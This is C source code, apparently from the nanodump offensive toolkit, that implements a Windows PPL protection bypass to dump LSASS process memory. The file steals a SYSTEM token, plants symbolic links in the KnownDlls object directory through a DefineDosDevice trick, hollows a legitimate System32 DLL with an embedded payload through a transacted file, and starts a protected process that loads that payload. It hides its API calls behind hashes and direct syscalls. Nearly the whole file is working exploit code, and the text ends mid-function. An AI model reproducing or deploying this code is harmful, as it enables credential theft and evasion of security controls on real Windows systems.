#include "ppl/ppl.h"

#ifdef EXE
 #ifdef _WIN64
  #include "nanodump_ppl_dll.x64.h"
 #else
  #include "nanodump_ppl_dll.x86.h"
 #endif
#endif

#ifdef BOF
#include "ppl_utils.c"
#include "../utils.c"
#include "../dinvoke.c"
#include "../syscalls.c"
#include "../token_priv.c"
#endif

BOOL run_ppl_bypass_exploit(
    IN unsigned char nanodump_dll[],
    IN unsigned int nanodump_dll_len,
    IN LPCSTR dump_path,
    IN BOOL use_valid_sig,
    IN BOOL fork_lsass,
    IN BOOL snapshot_lsass,
    IN BOOL duplicate_handle,
    IN BOOL use_malseclogon,
    IN LPCSTR malseclogon_target_binary)
{
    BOOL bCurrentUserIsSystem = FALSE;
    HANDLE hSystemToken = NULL;
    BOOL bImpersonationActive = FALSE;
    BOOL success;
    NTSTATUS status;
    BOOL bReturnValue = FALSE;

    // STEP 1
    LPWSTR pwszKnownDllsObjDir = L"\\GLOBAL??\\KnownDlls";
    HANDLE hKnownDllsObjDir = NULL;

    // STEP 2
    LPWSTR pwszDllToHijack = NULL;
    LPWSTR pwszDllLinkName = NULL;
    HANDLE hDllLink = NULL;
    SECURITY_DESCRIPTOR sd = { 0 };

    // STEP 3
    LPWSTR pwszFakeGlobalrootLinkName = L"\\??\\GLOBALROOT";
    LPWSTR pwszFakeGlobalrootLinkTarget = L"\\GLOBAL??";
    HANDLE hFakeGlobalrootLink = NULL;
    HANDLE hLocalServiceToken = NULL;

    // STEP 4
    LPWSTR pwszDosDeviceName = NULL;
    LPWSTR pwszDosDeviceTargetPath = NULL;

    // STEP 5
    LPWSTR pwszSectionName = NULL;
    HANDLE hDllSection = NULL;
    HANDLE hTransaction = NULL;

    // STEP 6
    LPWSTR pwszCommandLine = NULL;
    HANDLE hCurrentToken = NULL;
    HANDLE hNewProcessToken = NULL;
    HANDLE hNewProcess = NULL;
    SECURITY_QUALITY_OF_SERVICE Qos;
    OBJECT_ATTRIBUTES TokenObjectAttributes;

    if (!check_ppl_requirements())
        goto end;

    RevertToSelf_t RevertToSelf;
    RevertToSelf = (RevertToSelf_t)(ULONG_PTR)get_function_address(
        get_library_address(ADVAPI32_DLL, TRUE),
        RevertToSelf_SW2_HASH,
        0);
    if (!RevertToSelf)
    {
        DPRINT_ERR("Address of 'RevertToSelf' not found");
        goto end;
    }

    InitializeSecurityDescriptor_t InitializeSecurityDescriptor;
    InitializeSecurityDescriptor = (InitializeSecurityDescriptor_t)(ULONG_PTR)get_function_address(
        get_library_address(ADVAPI32_DLL, TRUE),
        InitializeSecurityDescriptor_SW2_HASH,
        0);
    if (!InitializeSecurityDescriptor)
    {
        DPRINT_ERR("Address of 'InitializeSecurityDescriptor' not found");
        goto end;
    }

    SetSecurityDescriptorDacl_t SetSecurityDescriptorDacl;
    SetSecurityDescriptorDacl = (SetSecurityDescriptorDacl_t)(ULONG_PTR)get_function_address(
        get_library_address(ADVAPI32_DLL, TRUE),
        SetSecurityDescriptorDacl_SW2_HASH,
        0);
    if (!SetSecurityDescriptorDacl)
    {
        DPRINT_ERR("Address of 'SetSecurityDescriptorDacl' not found");
        goto end;
    }

    DefineDosDeviceW_t DefineDosDeviceW;
    DefineDosDeviceW = (DefineDosDeviceW_t)(ULONG_PTR)get_function_address(
        get_library_address(KERNELBASE_DLL, TRUE),
        DefineDosDeviceW_SW2_HASH,
        0);
    if (!DefineDosDeviceW)
    {
        DPRINT_ERR("Address of 'DefineDosDeviceW' not found");
        goto end;
    }

    SetKernelObjectSecurity_t SetKernelObjectSecurity;
    SetKernelObjectSecurity = (SetKernelObjectSecurity_t)(ULONG_PTR)get_function_address(
        get_library_address(ADVAPI32_DLL, TRUE),
        SetKernelObjectSecurity_SW2_HASH,
        0);
    if (!SetKernelObjectSecurity)
    {
        DPRINT_ERR("Address of 'SetKernelObjectSecurity' not found");
        goto end;
    }

    if (file_exists(dump_path))
    {
        if (!delete_file(dump_path))
        {
            goto end;
        }
    }

    DPRINT("Get the name of the DLL to hijack");

    success = get_hijackeable_dllname(&pwszDllToHijack);
    if (!success)
        goto end;

    DPRINT("DLL to hijack: %ls", pwszDllToHijack);

    success = is_current_user_system(&bCurrentUserIsSystem);
    if (!success)
        goto end;

    DPRINT("Current user is SYSTEM? -> %x", bCurrentUserIsSystem);

    //
    // 1. Create the object directory '\GLOBAL??\KnownDlls'.
    //
    //    When executed as an administrator, this fails (access denied). Thanks to WinObj, we can 
    //    see that Administrators do have the "Add Object" right but the corresponding ACE applies 
    //    to child objects only, which means that they cannot add objects in the directory 
    //    '\Global??' itself. Therefore, we need to elevate to SYSTEM first. To do so we will 
    //    search for SYSTEM tokens among the running processes and steal one. This requires both
    //    SeImpersonatePrivilege and SeDebugPrivilege.
    //    Note: as long as the object is not marked as "permanent", we do not need to remove it 
    //    manually. When we close the last handle, the object is removed automatically.
    //
    if (!bCurrentUserIsSystem)
    {
        success = impersonate_system(&hSystemToken);
        if (!success)
        {
            DPRINT_ERR("Failed to impersonate SYSTEM");
            goto end;
        }

        bImpersonationActive = TRUE;

        DPRINT("Impersonating SYSTEM...");
    }

    success = object_manager_create_directory(
        pwszKnownDllsObjDir,
        &hKnownDllsObjDir);
    if (!success)
        goto end;

    DPRINT("Created Object Directory: '%ls'", pwszKnownDllsObjDir);

    //
    // 2. Create a symlink in '\GLOBAL??\KnownDlls\' with the name of a DLL to hijack. The target
    //    of the link doesn't matter.
    //
    //    The next steps will allow us to trick the CSRSS service into opening the symbolic link
    //    '\GLOBAL??\KnownDlls\FOO.dll' instead of '\KnownDlls\FOO.dll' while impersonating the
    //    caller. That's why we need to create this symbolic link beforehand. As the service will 
    //    just open the object itself, its target does not matter. 
    //

    pwszDllLinkName = intAlloc((MAX_PATH + 1) * sizeof(WCHAR));
    if (!pwszDllLinkName)
    {
        malloc_failed();
        goto end;
    }

    wcsncpy(pwszDllLinkName, pwszKnownDllsObjDir, MAX_PATH);
    wcsncat(pwszDllLinkName, L"\\", MAX_PATH);
    wcsncat(pwszDllLinkName, pwszDllToHijack, MAX_PATH);

    success = object_manager_create_symlik(
        pwszDllLinkName,
        DLL_LINK_TARGET,
        &hDllLink);
    if (!success || !hDllLink)
        goto end;

    DPRINT("Created Symbolic link: '%ls'", pwszDllLinkName);

    //
    // 3. Inside the user's DOS device directory create a new symbolic link called 'GLOBALROOT' 
    //    pointing to '\GLOBAL??'
    //
    //    The idea here is to create a "fake" GLOBALROOT that will point to a location we control
    //    because, at step 4, the CSRSS service will try to open '\??\GLOBALROOT\...' while
    //    impersonating the caller. '\??' represents the current user's DOS device directory. For 
    //    SYSTEM, '\??' points to '\GLOBAL??' so '\??\GLOBALROOT' is '\GLOBAL??\GLOBALROOT', which 
    //    is the actual GLOBALROOT. Therefore the trick would not work.
    //    However, for users other than SYSTEM, '\??' points to a dedicated DOS device directory
    //    such as '\Sessions\0\DosDevices\00000000-XXXXXXXX'. Therefore, we can create a fake 
    //    GLOBALROOT symbolic link that points to an arbitrary location. If we create this link so
    //    that '\Sessions\0\DosDevices\00000000-XXXXXXXX\GLOBALROOT' -> '\GLOBAL??', 
    //    '\??\GLOBALROOT' will actually point to '\GLOBAL??' instead of '\GLOBAL??\GLOBALROOT' in
    //    our context.
    //    To summarize:
    //      - If SYSTEM: '\??\GLOBALROOT' -> '' 
    //      - Else:      '\??\GLOBALROOT' -> '\GLOBAL??' (because of our symbolic link)
    //    Which means that:
    //      - If SYSTEM: '\??\GLOBALROOT\KnownDlls\FOO.DLL' -> '\KnownDlls\FOO.DLL'
    //      - Else:      '\??\GLOBALROOT\KnownDlls\FOO.DLL' -> '\GLOBAL??\KnownDlls\FOO.DLL'
    //
    //    So, at this step, we need to:
    //      - revert to self if we impersonated SYSTEM as an administrator;
    //      - impersonate another user (LOCAL SERVICE for example) if we were running as SYSTEM.
    //

    if (bCurrentUserIsSystem)
    {
        //
        // If we are running as SYSTEM, we need to impersonate another user. But, if we do so, the
        // the impersonated user will not have sufficient access on the symbolic link we just 
        // created and the DefineDosDevice call will fail with an "Access Denied" error. Therefore
        // we need to edit the ACL of the object first.
        // 
        success = InitializeSecurityDescriptor(&sd, SECURITY_DESCRIPTOR_REVISION);
        if (!success)
        {
            function_failed("InitializeSecurityDescriptor");
            goto end;
        }

        success = SetSecurityDescriptorDacl(&sd, TRUE, NULL, FALSE);
        if (!success)
        {
            function_failed("SetSecurityDescriptorDacl");
            goto end;
        }

        DPRINT("Set a NULL DACL on '%ls'", pwszDllLinkName);

        success = SetKernelObjectSecurity(
            hDllLink,
            DACL_SECURITY_INFORMATION,
            &sd);
        if (!success)
        {
            function_failed("SetKernelObjectSecurity");
            goto end;
        }

        success = impersonate_local_service(&hLocalServiceToken);
        if (!success)
            goto end;

        bImpersonationActive = TRUE;

        DPRINT("Impersonating LOCAL SERVICE...");
    }
    else
    {
        success = RevertToSelf();
        if (!success)
        {
            function_failed("RevertToSelf");
            goto end;
        }

        bImpersonationActive = FALSE;
    }

    success = object_manager_create_symlik(
        pwszFakeGlobalrootLinkName,
        pwszFakeGlobalrootLinkTarget,
        &hFakeGlobalrootLink);
    if (!success)
        goto end;

    DPRINT("Created symbolic link: '%ls -> %ls'", pwszFakeGlobalrootLinkName, pwszFakeGlobalrootLinkTarget);

    //
    // 4. Call DefineDosDevice specifying a device name of "GLOBALROOT\KnownDlls\FOO.DLL" and a target
    //    path of a location that the user can create section objects inside.
    //
    //    This still need to be executed as a user other than SYSTEM, so that all the symbolic links 
    //    are properly followed. This is the "fun" part. DefineDosDevice actually results in an RPC 
    //    call to the CSRSS service. On server side, here is how the device name will be interpreted:
    //      a. it receives the device name as the second argument;
    //             >>> GLOBALROOT\KnownDlls\FOO.DLL
    //      b. it will first prepend it with '\??\';
    //             >>> \??\GLOBALROOT\KnownDlls\FOO.DLL
    //      c. it will try to open the symbolic link while impersonating the client, the call succeeds
    //         because we control this symlink (step 1)
    //             >>> \GLOBAL??\KnownDlls\FOO.DLL (\??\GLOBALROOT -> \GLOBAL??)
    //      d. it checks whether the path starts with \GLOBAL??\ to determine if it's global;
    //      e. as it does, it rewrites the path and prepends it with '\GLOBAL??\', considers the link
    //         as global and disables impersonation;
    //             >>> \GLOBAL??\GLOBALROOT\KnownDlls\FOO.DLL
    //      f. but \GLOBAL??\GLOBALROOT, which is the real GLOBALROOT
    //             >>> \KnownDlls\FOO.DLL
    //      g. if invokes NtCreateSymbolicLinkObject without impersonating the user and therefore 
    //         creates a symlink inside '\KnownDlls\' with an arbitrary name and an arbitrary target
    //         path.
    //
    //    /!\  The purpose of the initial open operation is to delete the symlink and this is always
    //         done while impersonating the user. Therefore we won't be able to delete the symlink
    //         that was created in \KnownDlls\. We will have to remove it once we are running code 
    //         inside a PPL with WinTCB level.
    //
    pwszDosDeviceName = intAlloc((MAX_PATH + 1) * sizeof(WCHAR));
    if (!pwszDosDeviceName)
    {
        malloc_failed();
        goto end;
    }

    pwszDosDeviceTargetPath = intAlloc((MAX_PATH + 1) * sizeof(WCHAR));
    if (!pwszDosDeviceTargetPath)
    {
        malloc_failed();
        goto end;
    }

    wcsncpy(pwszDosDeviceName, L"GLOBALROOT\\KnownDlls\\", MAX_PATH);
    wcsncat(pwszDosDeviceName, pwszDllToHijack, MAX_PATH);
    wcsncpy(pwszDosDeviceTargetPath, L"\\KernelObjects\\", MAX_PATH);
    wcsncat(pwszDosDeviceTargetPath, pwszDllToHijack, MAX_PATH);

    DPRINT("Call DefineDosDevice to create '\\KnownDlls\\%ls' -> '%ls'", pwszDllToHijack, pwszDosDeviceTargetPath);

    success = DefineDosDeviceW(
        DDD_NO_BROADCAST_SYSTEM | DDD_RAW_TARGET_PATH,
        pwszDosDeviceName,
        pwszDosDeviceTargetPath);
    if (!success && GetLastError() != ERROR_ALREADY_EXISTS)
    {
        PRINT_ERR("Call to 'DefineDosDeviceW' failed, error: %ld", GetLastError());
        goto end;
    }

    DPRINT("DefineDosDevice OK");

    //
    // Make sure the link was really created as a consequence of the DefineDosDevice call. But 
    // first, let's revert to self if we are running as SYSTEM or impersonate SYSTEM again.
    //
    if (bCurrentUserIsSystem)
    {
        success = RevertToSelf();
        if (!success)
        {
            function_failed("RevertToSelf");
            goto end;
        }

        bImpersonationActive = FALSE;
    }
    else
    {
        success = impersonate(hSystemToken);
        if (!success)
            goto end;

        bImpersonationActive = TRUE;

        DPRINT("Impersonating SYSTEM...");
    }

    DPRINT("Check whether the symbolic link was really created in '\\KnownDlls\\'");

    success = check_known_dll_symbolic_link(
        pwszDllToHijack,
        pwszDosDeviceTargetPath);
    if (!success)
    {
        PRINT_ERR("The symbolic link '\\KnownDlls\\%ls' was not created.", pwszDllToHijack);
        goto end;
    }

    DPRINT("The symbolic link was successfully created: '\\KnownDlls\\%ls' -> '%ls'", pwszDllToHijack, pwszDosDeviceTargetPath);

    //
    // 5. Create the image section object at the target location for an arbitrary DLL.
    //
    //    Final piece of the puzzle. Now that we have a symbolic link in \KnownDlls that points to
    //    an arbitrary location, we just have to create a new Section at this location and map our
    //    payload DLL.
    //
    pwszSectionName = pwszDosDeviceTargetPath;

    success = map_dll(
        nanodump_dll,
        nanodump_dll_len,
        pwszSectionName,
        &hDllSection,
        &hTransaction);
    if (!success)
    {
        DPRINT_ERR("Failed to map the DLL.");
        goto end;
    }

    DPRINT("Mapped payload DLL to: '%ls'", pwszSectionName);

    //
    // 6. Create a PPL process and hijack one of the DLLs it tries to load
    //
    //    First we need to prepare the command line that we are going to execute.
    //    Then we need to get a SYSTEM token to start our new process. If the current process was 
    //    started as SYSTEM, we can simply copy this token. If SYSTEM was impersonated, we need to
    //    copy the current thread's token.
    //    Finally, we can start our protected process with the prepared command line and the 
    //    duplicated token.
    //
    success = prepare_ppl_command_line(
        dump_path,
        use_valid_sig,
        fork_lsass,
        snapshot_lsass,
        duplicate_handle,
        use_malseclogon,
        malseclogon_target_binary,
        &pwszCommandLine);
    if (!success)
        goto end;

    if (bCurrentUserIsSystem)
    {
        status = NtOpenProcessToken(
            NtCurrentProcess(),
            TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ADJUST_PRIVILEGES,
            &hCurrentToken);
        if (!NT_SUCCESS(status))
        {
            syscall_failed("NtOpenProcessToken", status);
            goto end;
        }
    }
    else
    {
        status = NtOpenThreadToken(
            NtCurrentThread(),
            TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ADJUST_PRIVILEGES,
            FALSE,
            &hCurrentToken);
        if (!NT_SUCCESS(status))
        {
            syscall_failed("NtOpenThreadToken", status);
            goto end;
        }
    }

    DPRINT("Enable privilege SeAssignPrimaryTokenPrivilege");

    success = check_token_privilege(
        hCurrentToken,
        L"SeAssignPrimaryTokenPrivilege",
        TRUE);
    if (!success)
    {
        DPRINT_ERR("Could not enable SeAssignPrimaryTokenPrivilege");
        goto end;
    }

    DPRINT("Create a primary token");

    InitializeObjectAttributes(&TokenObjectAttributes, NULL, 0, NULL, NULL);
    Qos.Length = sizeof(SECURITY_QUALITY_OF_SERVICE);
    Qos.ImpersonationLevel = SecurityAnonymous;
    Qos.ContextTrackingMode = 0;
    Qos.EffectiveOnly = FALSE;
    TokenObjectAttributes.SecurityQualityOfService = &Qos;

    status = NtDuplicateToken(
        hCurrentToken,
        MAXIMUM_ALLOWED,
        &TokenObjectAttributes,
        FALSE,
        TokenPrimary,
        &hNewProcessToken);
    if (!success)
    {
        syscall_failed("NtDuplicateToken", status);
        goto end;
    }

    DPRINT("Create protected process with command line: %ls", pwszCommandLine);

    success = create_protected_process_as_user(
        hNewProcessToken,
        pwszCommandLine,
        &hNewProcess);
    if (!success)
    {
        PRINT_ERR("Failed to create the PPL process");
        goto end;
    }

    intFree(pwszCommandLine); pwszCommandLine = NULL;

    success = wait_for_process(hNewProcess);
    if (!success)
        goto end;

    DPRINT("Done.");

    NtClose(hNewProcess); hNewProcess = NULL;
    NtClose(hDllSection); hDllSection = NULL;

    DPRINT("Unmapped section '%ls'", pwszSectionName);

    if (bImpersonationActive)
    {
        RevertToSelf(); // If impersonation was active, drop it first
        bImpersonationActive = FALSE;
    }

    if (!file_exists(dump_path))
    {
        PRINT_ERR("Failed, the dump was not created.");
        goto end;
    }

    print_success(
        dump_path,
        use_valid_sig,
        TRUE);

    bReturnValue = TRUE;

end:
    if (bImpersonationActive)
        RevertToSelf(); // If impersonation was active, drop it first
    if (hNewProcessToken)
        NtClose(hNewProcessToken);
    if (pwszCommandLine)
        LocalFree(pwszCommandLine);
    if (pwszDosDeviceName)
        LocalFree(pwszDosDeviceName);
    if (pwszDosDeviceTargetPath)
        LocalFree(pwszDosDeviceTargetPath);
    if (hDllLink)
        NtClose(hDllLink);
    if (pwszDllLinkName)
        intFree(pwszDllLinkName);
    if (hKnownDllsObjDir)
        NtClose(hKnownDllsObjDir);
    if (hLocalServiceToken)
        NtClose(hLocalServiceToken);
    if (hSystemToken)
        NtClose(hSystemToken);
    if (pwszDllToHijack)
        intFree(pwszDllToHijack);
    if (hDllSection)
        NtClose(hDllSection);
    if (hNewProcess)
        NtClose(hNewProcess);
    if (hTransaction)
        NtClose(hTransaction);

    return bReturnValue;
}

BOOL create_protected_process_as_user(
    IN HANDLE hToken,
    IN LPWSTR pwszCommandLine,
    OUT PHANDLE phProcess)
{
    STARTUPINFOW si = { 0 };
    PROCESS_INFORMATION pi = { 0 };
    BOOL success;
    CreateProcessAsUserW_t CreateProcessAsUserW;
    *phProcess = NULL;

    CreateProcessAsUserW = (CreateProcessAsUserW_t)(ULONG_PTR)get_function_address(
        get_library_address(ADVAPI32_DLL, TRUE),
        CreateProcessAsUserW_SW2_HASH,
        0);
    if (!CreateProcessAsUserW)
    {
        DPRINT_ERR("Address of 'CreateProcessAsUserW' not found");
        return FALSE;
    }

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);

    success = CreateProcessAsUserW(
        hToken,
        NULL,
        pwszCommandLine,
        NULL,
        NULL,
        TRUE,
        CREATE_PROTECTED_PROCESS,
        NULL,
        NULL,
        &si,
        &pi);
    if (!success)
    {
        function_failed("CreateProcessAsUserW");
        return FALSE;
    }

    NtClose(pi.hThread); pi.hThread = NULL;
    *phProcess = pi.hProcess;

    return TRUE;
}

BOOL prepare_ppl_command_line(
    IN LPCSTR dump_path,
    IN BOOL use_valid_sig,
    IN BOOL fork_lsass,
    IN BOOL snapshot_lsass,
    IN BOOL duplicate_handle,
    IN BOOL use_malseclogon,
    IN LPCSTR malseclogon_target_binary,
    OUT LPWSTR* command_line)
{
    WCHAR wszSystemDir[MAX_PATH] = { 0 };
    size_t size = 32767;
    GetSystemDirectoryW_t GetSystemDirectoryW;

    GetSystemDirectoryW = (GetSystemDirectoryW_t)(ULONG_PTR)get_function_address(
        get_library_address(KERNEL32_DLL, TRUE),
        GetSystemDirectoryW_SW2_HASH,
        0);
    if (!GetSystemDirectoryW)
    {
        DPRINT_ERR("Address of 'GetSystemDirectoryW' not found");
        return FALSE;
    }

    *command_line = intAlloc(size * sizeof(WCHAR));
    if (!*command_line)
    {
        malloc_failed();
        return FALSE;
    }

    // program path
    GetSystemDirectoryW(wszSystemDir, MAX_PATH);
    wcsncpy(*command_line, wszSystemDir, size);
    wcsncat(*command_line, L"\\", size);
    wcsncat(*command_line, PPL_BINARY, size);
    // dump path
    wchar_t dump_path_w[MAX_PATH];
    mbstowcs(dump_path_w, dump_path, MAX_PATH);
    wcsncat(*command_line, L" -w ", size);
    wcsncat(*command_line, dump_path_w, size);
    // --fork
    if (fork_lsass)
        wcsncat(*command_line, L" -f", size);
    // --snapshot
    if (snapshot_lsass)
        wcsncat(*command_line, L" -s", size);
    // --valid
    if (use_valid_sig)
        wcsncat(*command_line, L" -v", size);
    // --dup
    if (duplicate_handle)
        wcsncat(*command_line, L" -d", size);
    // --malseclogon
    if (use_malseclogon)
    {
        wcsncat(*command_line, L" -m", size);
        wchar_t malseclogon_target_binary_w[MAX_PATH];
        mbstowcs(malseclogon_target_binary_w, malseclogon_target_binary, MAX_PATH);
        wcsncat(*command_line, L" -b ", size);
        wcsncat(*command_line, malseclogon_target_binary_w, size);
    }

    return TRUE;
}

BOOL find_file_for_transaction(
    IN DWORD dwMinSize,
    OUT LPWSTR* ppwszFilePath)
{
    BOOL bReturnValue = FALSE;
    WCHAR wszSystemDir[MAX_PATH] = { 0 };
    WCHAR wszSearchPath[MAX_PATH] = { 0 };
    WCHAR wszFilePath[MAX_PATH] = { 0 };
    WIN32_FIND_DATAW wfd = { 0 };
    UNICODE_STRING name = { 0 };
    HANDLE hFind = NULL;
    HANDLE hFile = NULL;
    PSID pSidOwner = NULL;
    PSECURITY_DESCRIPTOR pSD = NULL;
    DWORD dwFileSize = 0;
    PSID pSidTarget = NULL;
    ConvertStringSidToSidW_t ConvertStringSidToSidW;
    GetSecurityInfo_t GetSecurityInfo;
    GetSystemDirectoryW_t GetSystemDirectoryW;
    FindFirstFileW_t FindFirstFileW;
    FindNextFileW_t FindNextFileW;
    FindClose_t FindClose;
    OBJECT_ATTRIBUTES oa;
    IO_STATUS_BLOCK IoStatusBlock;
    BOOL success;
    DWORD error_code;

    ConvertStringSidToSidW = (ConvertStringSidToSidW_t)(ULONG_PTR)get_function_address(
        get_library_address(ADVAPI32_DLL, TRUE),
        ConvertStringSidToSidW_SW2_HASH,
        0);
    if (!ConvertStringSidToSidW)
    {
        DPRINT_ERR("Address of 'ConvertStringSidToSidW' not found");
        return FALSE;
    }

    GetSecurityInfo = (GetSecurityInfo_t)(ULONG_PTR)get_function_address(
        get_library_address(ADVAPI32_DLL, TRUE),
        GetSecurityInfo_SW2_HASH,
        0);
    if (!GetSecurityInfo)
    {
        DPRINT_ERR("Address of 'GetSecurityInfo' not found");
        return FALSE;
    }

    GetSystemDirectoryW = (GetSystemDirectoryW_t)(ULONG_PTR)get_function_address(
        get_library_address(KERNEL32_DLL, TRUE),
        GetSystemDirectoryW_SW2_HASH,
        0);
    if (!GetSystemDirectoryW)
    {
        DPRINT_ERR("Address of 'GetSystemDirectoryW' not found");
        return FALSE;
    }

    FindClose = (FindClose_t)(ULONG_PTR)get_function_address(
        get_library_address(KERNEL32_DLL, TRUE),
        FindClose_SW2_HASH,
        0);
    if (!FindClose)
    {
        DPRINT_ERR("Address of 'FindClose' not found");
        return FALSE;
    }

    FindFirstFileW = (FindFirstFileW_t)(ULONG_PTR)get_function_address(
        get_library_address(KERNEL32_DLL, TRUE),
        FindFirstFileW_SW2_HASH,
        0);
    if (!FindFirstFileW)
    {
        DPRINT_ERR("Address of 'FindFirstFileW' not found");
        return FALSE;
    }

    FindNextFileW = (FindNextFileW_t)(ULONG_PTR)get_function_address(
        get_library_address(KERNEL32_DLL, TRUE),
        FindNextFileW_SW2_HASH,
        0);
    if (!FindNextFileW)
    {
        DPRINT_ERR("Address of 'FindNextFileW' not found");
        return FALSE;
    }

    ConvertStringSidToSidW(L"S-1-5-18", &pSidTarget);

    GetSystemDirectoryW(wszSystemDir, MAX_PATH);    // C:\Windows\System32
    wcsncpy(wszSearchPath, wszSystemDir, MAX_PATH);
    wcsncat(wszSearchPath, L"\\*.dll", MAX_PATH);   // C:\Windows\System32\*.dll

    hFind = FindFirstFileW(wszSearchPath, &wfd);
    if (hFind == INVALID_HANDLE_VALUE)
        return FALSE;

    do
    {
        wcsncpy(wszFilePath, L"\\??\\", MAX_PATH);
        wcsncat(wszFilePath, wszSystemDir, MAX_PATH);
        wcsncat(wszFilePath, L"\\", MAX_PATH);
        wcsncat(wszFilePath, wfd.cFileName, MAX_PATH);
        name.Buffer  = wszFilePath;
        name.Length  = wcsnlen(name.Buffer, MAX_PATH);;
        name.Length *= 2;
        name.MaximumLength = name.Length + 2;
        InitializeObjectAttributes(&oa, &name, OBJ_CASE_INSENSITIVE, NULL, NULL);

        NTSTATUS status = NtCreateFile(
            &hFile,
            FILE_GENERIC_READ,
            &oa,
            &IoStatusBlock,
            NULL,
            FILE_ATTRIBUTE_NORMAL,
            FILE_SHARE_READ,
            FILE_OPEN,
            FILE_SYNCHRONOUS_IO_NONALERT,
            NULL,
            0);
        if (NT_SUCCESS(status))
        {
            success = get_file_size(hFile, &dwFileSize);
            if (success && dwFileSize > dwMinSize)
            {
                // TODO: use a lower level API?
                error_code = GetSecurityInfo(
                    hFile,
                    SE_FILE_OBJECT,
                    OWNER_SECURITY_INFORMATION,
                    &pSidOwner,
                    NULL,
                    NULL,
                    NULL,
                    &pSD);
                if (error_code == ERROR_SUCCESS)
                {
                    success = token_compare_sids(
                        pSidOwner,
                        pSidTarget);
                    if (success)
                    {
                        *ppwszFilePath = intAlloc(MAX_PATH * sizeof(WCHAR));
                        if (*ppwszFilePath)
                        {
                            wcsncpy(*ppwszFilePath, wszFilePath, MAX_PATH);
                            bReturnValue = TRUE;
                        }
                    }
                }
            }
            NtClose(hFile); hFile = NULL;
        }
    } while (!bReturnValue && FindNextFileW(hFind, &wfd));

    FindClose(hFind); hFind = NULL;

    return bReturnValue;
}

BOOL write_payload_dll_transacted(
    IN unsigned char nanodump_dll[],
    IN unsigned int nanodump_dll_len,
    OUT PHANDLE pdhFile,
    OUT PHANDLE phTransaction)
{
    //
    // This implementation was inspired by the DLL Hollowing technique, discussed by @_ForrestOrr
    // in this blog post: Masking Malicious Memory Artifacts – Part I: Phantom DLL Hollowing
    // https://www.forrest-orr.net/post/malicious-memory-artifacts-part-i-dll-hollowing
    // This trick is awesome! :)
    //
    // Here is the idea. Rather than writing our embedded DLL to disk, we open an existing DLL file
    // as a transaction operation. Then, we replace the content of the DLL with our own. To so, we
    // search for an existing DLL file in C:\Windows\System32. We assume we are executing this code
    // as SYSTEM but still, this is not sufficient as we need to open the target file with write 
    // access even though the file will not be modified. As most of the files are owned by Trusted-
    // Installer, we need to find one which is owned by SYSTEM and also make sure that it is big
    // enough so that we can copy our own DLL.
    //
    // Note: actually, in our case, it doesn't matter whether the target file is a DLL or a regular
    // file. But hey, this works just fine. ;)
    //

    BOOL bReturnValue = FALSE;
    LPWSTR pwszTargetFile = NULL;
    NTSTATUS status = 0;
    OBJECT_ATTRIBUTES oa = { sizeof(OBJECT_ATTRIBUTES) };
    HANDLE hTransaction = NULL;
    HANDLE hTransactedFile = NULL;
    BOOL success = FALSE;
    IO_STATUS_BLOCK IoStatusBlock;
    CreateFileTransactedW_t CreateFileTransactedW;

    CreateFileTransactedW = (CreateFileTransactedW_t)(ULONG_PTR)get_function_address(
        get_library_address(KERNEL32_DLL, TRUE),
        CreateFileTransactedW_SW2_HASH,
        0);
    if (!CreateFileTransactedW)
    {
        DPRINT_ERR("Address of 'CreateFileTransactedW' not found");
        goto end;
    }

    //
    // Find a legtimate DLL file to "hollow". It must not be owned by TrustedInstaller and it must
    // be big enough so that we can copy our payload into the transacted file.
    //
    success = find_file_for_transaction(
        nanodump_dll_len,
        &pwszTargetFile);
    if (!success)
    {
        PRINT_ERR("Could not find file for transaction");
        goto end;
    }

    DPRINT("Found file for transaction: %ls", pwszTargetFile);

    status = NtCreateTransaction(
        &hTransaction,
        TRANSACTION_ALL_ACCESS,
        &oa,
        NULL,
        NULL,
        0,
        0,
        0,
        NULL,
        NULL);
    if (!NT_SUCCESS(status))
    {
        syscall_failed("NtCreateTransaction", status);
        goto end;
    }

    //
    // Open a legitimate DLL file as a transaction operation.
    //
    hTransactedFile = CreateFileTransactedW(
        pwszTargetFile,
        GENERIC_READ | GENERIC_WRITE,
        0,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL,
        hTransaction,
        NULL,
        NULL);
    if (hTransactedFile == INVALID_HANDLE_VALUE)
    {
        function_failed("CreateFileTransactedW");
        goto end;
    }

    DPRINT("Opened file '%ls' for transaction.", pwszTargetFile);

    //
    // Replace the content of the legitimate file with our own DLL payload. It's important to note
    // that the file on disk is not altered.
    //
    status = NtWriteFile(
        hTransactedFile,
        NULL,
        NULL,
        NULL,
        &IoStatusBlock,
        nanodump_dll,
        nanodump_dll_len,
        NULL,
        NULL);
    if (!NT_SUCCESS(status))
    {
        syscall_failed("NtWriteFile", status);
        goto end;
    }

    DPRINT("Wrote 0x%x bytes of embedded payload DLL to transacted file %ls.", nanodump_dll_len, pwszTargetFile);

    *pdhFile = hTransactedFile;
    *phTransaction = hTransaction;
    bReturnValue = TRUE;

end:
    if (pwszTargetFile)
        intFree(pwszTargetFile);

    return bReturnValue;
}

BOOL map_dll(
    IN unsigned char nanodump_dll[],
    IN unsigned int nanodump_dll_len,
    IN LPWSTR pwszSectionName,
    OUT PHANDLE phSection,
    OUT PHANDLE phTransaction)
{
    BOOL bReturnValue = FALSE;
    OBJECT_ATTRIBUTES oa = { 0 };
    UNICODE_STRING sectionName = { 0 };
    NTSTATUS status = 0;
    HANDLE hSection = NULL;
    BOOL success;
    HANDLE hDllTransacted = NULL;
    *phSection = NULL;

    success = write_payload_dll_transacted(
        nanodump_dll,
        nanodump_dll_len,
        &hDllTransacted,
        phTransaction);
    if (!success)
        goto end;

    sectionName.Buffer  = pwszSectionName;
    sectionName.Length  = wcsnlen(sectionName.Buffer, MAX_PATH);;
    sectionName.Length *= 2;
    sectionName.MaximumLength = sectionName.Length + 2;
    InitializeObjectAttributes(&oa, &sectionName, OBJ_CASE_INSENSITIVE, NULL, NULL);

    //
    // According to the documentation, the SEC_IMAGE attribute must be combined with the page 
    // protection value PAGE_READONLY. But the page protection has actually no effect because the 
    // page protection is determined by the executable file itself.
    // https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createfilemappinga
    //
    status = NtCreateSection(
        &hSection,
        SECTION_ALL_ACCESS,
        &oa,
        NULL,
        PAGE_READONLY,
        SEC_IMAGE,
        hDllTransacted);
    if (!NT_SUCCESS(status))
    {
        syscall_failed("NtCreateSection", status);
        goto end;
    }

